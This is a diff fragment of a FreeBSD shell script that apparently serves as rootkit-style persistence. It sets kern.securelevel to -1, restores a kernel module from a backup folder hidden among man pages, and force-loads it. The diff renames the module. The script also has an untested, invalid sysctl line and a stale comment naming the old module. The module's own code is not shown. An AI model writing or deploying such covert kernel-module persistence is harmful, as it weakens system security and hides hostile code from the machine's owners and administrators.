@@ -9,12 +9,12 @@ sleep 10
 # untested line!!!
 kern.securelevel=-1
 
-LKM_NAME="LD_PRELOAD.ko"
+LKM_NAME="apeshit.ko"
 BACKUP_DIR="/usr/local/share/man/man1/backups"
 # Check if LD_PRELOAD.ko exists in /boot/modules
 if [ ! -f /boot/modules/$LKM_NAME ]; then
     cp "$BACKUP_DIR/$LKM_NAME" "/boot/modules/"
 fi
 
-/sbin/kldstat | grep -q "LD_PRELOAD.ko" || /sbin/kldload /boot/modules/LD_PRELOAD.ko
+/sbin/kldstat | grep -q "apeshit.ko" || /sbin/kldload /boot/modules/apeshit.ko
 
